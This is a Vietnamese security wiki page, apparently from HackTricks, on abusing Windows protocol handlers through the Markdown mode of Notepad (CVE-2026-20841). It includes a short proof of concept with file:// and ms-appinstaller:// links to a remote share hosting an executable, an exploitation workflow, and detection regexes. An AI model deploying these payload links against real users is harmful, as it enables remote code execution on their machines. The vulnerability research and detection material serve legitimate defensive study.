# Lạm dụng Windows Protocol Handler / ShellExecute (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Các ứng dụng Windows render Markdown hoặc HTML có thể chuyển các mục tiêu được nhấp đến `ShellExecuteExW`. Vì ShellExecute điều phối các URI scheme và file association đã đăng ký, renderer cần có allowlist rõ ràng thay vì mặc định rằng mọi liên kết đều là HTTP(S). Hành vi của Notepad được mô tả bên dưới là về CVE-2026-20841 và không nên áp dụng khái quát cho mọi renderer.<sup>[[1]](#references)[[3]](#references)</sup>

## Bề mặt ShellExecuteExW trong chế độ Markdown của Windows Notepad
- Notepad chỉ chọn chế độ Markdown cho **phần mở rộng `.md`** bằng phép so sánh chuỗi cố định trong `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Các liên kết Markdown được hỗ trợ:
  - Chuẩn: `[text](target)`
  - Autolink: `<target>` (được render thành `[target](target)`), vì vậy cả hai cú pháp đều cần được lưu ý khi tạo payload và phát hiện.
- Các lần nhấp vào liên kết được xử lý trong `sub_140170F60()`, hàm này thực hiện lọc yếu rồi gọi `ShellExecuteExW`.
- `ShellExecuteExW` điều phối đến **bất kỳ protocol handler nào đã được cấu hình**, không chỉ HTTP(S).<sup>[[1]](#references)</sup>

### Những điều cần lưu ý về payload
- Mọi chuỗi `\\` trong liên kết đều được **chuẩn hóa thành `\`** trước khi gọi `ShellExecuteExW`, ảnh hưởng đến việc tạo UNC/path và phát hiện.
- Theo mặc định, các tệp `.md` **không được liên kết với Notepad**; nạn nhân vẫn phải mở tệp bằng Notepad và nhấp vào liên kết, nhưng sau khi được render thì liên kết có thể nhấp được.
- Các scheme nguy hiểm, ví dụ:<sup>[[1]](#references)</sup>
  - `file://` để chạy payload cục bộ/UNC.
  - `ms-appinstaller://` để kích hoạt các luồng App Installer. Các scheme khác được đăng ký cục bộ cũng có thể bị lạm dụng.

### Markdown PoC tối giản
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Quy trình khai thác
1. Tạo một **tệp `.md`** để Notepad hiển thị tệp dưới dạng Markdown.
2. Nhúng một liên kết dùng URI scheme nguy hiểm (`file:`, `ms-appinstaller:` hoặc bất kỳ handler nào đã cài đặt).
3. Gửi tệp (qua HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB hoặc giao thức tương tự) và thuyết phục người dùng mở tệp trong Notepad.
4. Khi được nhấp, **liên kết đã chuẩn hóa** được chuyển đến `ShellExecuteExW` và protocol handler tương ứng thực thi nội dung được tham chiếu trong ngữ cảnh của người dùng.<sup>[[1]](#references)[[2]](#references)</sup>

## Ý tưởng phát hiện
- Giám sát việc truyền tệp `.md` qua các cổng/giao thức thường dùng để gửi tài liệu: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Phân tích các liên kết Markdown (dạng chuẩn và autolink), tìm `file:` hoặc `ms-appinstaller:` **không phân biệt chữ hoa chữ thường**.
- Các regex do nhà cung cấp hướng dẫn để phát hiện truy cập tài nguyên từ xa:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Bản sửa lỗi của nhà cung cấp được ZDI mô tả giới hạn các đích được chấp nhận ở tệp cục bộ và HTTP(S). Mở rộng phạm vi phát hiện để bao gồm các protocol handler khác đã cài đặt khi cần, vì bề mặt tấn công đã đăng ký thay đổi tùy theo hệ thống.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Thực thi mã tùy ý trong Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
